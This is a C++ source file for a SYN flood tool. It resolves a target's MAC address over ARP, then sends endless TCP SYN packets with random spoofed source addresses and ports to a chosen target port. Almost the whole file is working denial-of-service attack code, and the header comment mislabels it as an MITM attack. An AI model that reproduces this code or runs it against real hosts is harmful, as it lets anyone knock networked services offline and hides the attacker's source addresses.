/*!
 * \file SynFlood.
 * \brief Class for run MITM attack.
 * \author Jeremy ZYRA
 * \version 1.0
 */
#include "SynFlood.hpp"

SynFlood::SynFlood(char *iface, char *target, int port, bool verbose) {
	char errbuf[PCAP_ERRBUF_SIZE];
	_port = port;
	_verbose = verbose;
	//Open network interface with libpcap
	if ((_iface = pcap_open_live(iface, PACKET_SIZE, PROMISC_MODE, TIMEOUT_MS, errbuf)) != NULL) {
		//Get network device's IPV4 address.
		uint8Ip deviceIp = NetworkUtilities::getIpAddr(iface);
		//Get network device's MAC address.
		ucharMac deviceMac = NetworkUtilities::getMacAddr(iface);
		//Loop for copy IP address to class's attributes.
		for (int i=0; i<4; ++i) {
			_targetIp.datas[i] = ((inet_addr(target) >> (i*8)) & 0xFF);
			_deviceIp.datas[i] = deviceIp.datas[i];
		}
		for (int i=0; i<6; ++i) {
			_deviceMac.datas[i] = deviceMac.datas[i];
		}
	} else {
		cerr << "[-] Error: " << errbuf << endl;
		exit(1);
	}
}

void SynFlood::run() {
	ucharMac *targetMac;
	int mult = 1;
	u_int32_t ipDest = 0;
	for(int i = 0; i<4; ++i) {
		ipDest = ipDest + _targetIp.datas[i]*mult;
		mult *= 0x100;
	}
	cout << "[+] Start SYN flooding." << endl;
	//Get MAC address of target.
	targetMac = getTargetMac();
	if(targetMac != NULL) {
		cout << "[+] Target's MAC address is: ";
		NetworkUtilities::printUcharMac(*targetMac);
		cout << endl;
		cout << "[+] SYN floodind in progress..." << endl;
		for(;;) {
			ucharMac macSource = _deviceMac;
			int srcPort = rand()%65535;
			u_int32_t sAddr = rand() % 0xffffffff;
			Tcp syn(_iface);
			syn.setDstMac(*targetMac);
			syn.setSaddr(sAddr);
			syn.setDaddr(ipDest);
			syn.setSrcMac(macSource);
			syn.setDest(_port);
			syn.setSource(srcPort);
			syn.setId(rand()%65536);
			syn.setSeq((rand()%65536)*(rand()%65536));
			//Send SYN packet.
			int res = syn.send();
			if (res == 0) {
				if (_verbose) {
						cout << "[+] TCP SYN sended to ";
						NetworkUtilities::printUint32Ip(ipDest);
						cout << ":" << _port << " from ";
						NetworkUtilities::printUint32Ip(sAddr);
						cout << ":" << srcPort << endl;
				}
			} else {
				cerr << "[-] Error for send packet." << endl;
			}
		}
	} else {
		cerr << "[-] Error: Can't find target's MAC address." << endl;
		exit(1);
	}
}

ucharMac *SynFlood::getTargetMac() {
	ucharMac *mac = new ucharMac;
	ucharMac broadcast;
	struct bpf_program fp;
	const u_char *packet;
	struct pcap_pkthdr header;
	struct ether_arp *arpHeader;
	Arp request(_iface);
	//Fill broadcast MAC address
	for (int i = 0; i<6; ++i) {
		broadcast.datas[i] = 0xff;
	}
	//ARP request for get MAC address to target.
	request.setSrcMac(_deviceMac);
	request.setDstMac(broadcast);
	//Request ARP request.
	request.setOp(0x0100);
	request.setSrcArpMac(_deviceMac);
	request.setSrcIp(_deviceIp);
	request.setDstIp(_targetIp);
	request.send();
	//Comile pcap filter for get next arp reply.
	pcap_compile(_iface, &fp, "arp", 0x100, PCAP_NETMASK_UNKNOWN);
	pcap_setfilter(_iface, &fp);
	//Get reply with target's MAC address.
	packet = pcap_next(_iface, &header);
	if (packet != NULL) {
		//Copy ARP header of ARP reply.
		arpHeader = (struct ether_arp *)(packet + sizeof(struct ether_header));
		for (int i=0; i < 6; ++i) {
			mac->datas[i] = arpHeader->arp_sha[i];
		}
		return mac;
	} else {
		return NULL;
	}
}
